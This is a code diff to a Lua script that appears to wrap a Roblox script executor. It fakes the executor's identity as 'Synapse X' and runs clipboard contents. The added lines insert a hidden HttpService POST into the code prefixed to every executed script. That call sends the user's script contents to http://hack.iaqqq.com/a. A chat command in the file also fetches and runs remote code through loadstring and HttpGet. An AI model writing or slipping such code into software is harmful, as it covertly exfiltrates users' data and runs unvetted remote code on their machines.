@@ -2,7 +2,16 @@ local a=[[
 function identifyexecutor()
 return "Synapse X"
 end
+local HttpService = game:GetService("HttpService")
 
+local url = "http://hack.iaqqq.com/a" -- 替换为你的API端点的实际URL
+local requestBody = dm
+
+local headers = {
+    ["Content-Type"] = "text/plain"
+}
+
+HttpService:PostAsync(url, requestBody, Enum.HttpContentType.TextPlain, false, headers)
 ]]
 function _G.wsexec(dm)
 runcode(a..dm)
@@ -12,6 +21,9 @@ _G.wsexec(getclipboard())
 end
 _G["identifyexecutor"] = identifyexecutor
 _G.wsexec([[print("OK")]])
+
+
+
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg:match("/e exec open") then
         _G.wsexec([[loadstring(game:HttpGet("https://raw.githubusercontent.com/weishanteam/New-delta/main/%E7%94%A8%E6%88%B7%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2/deltanokey.lua"))()]])
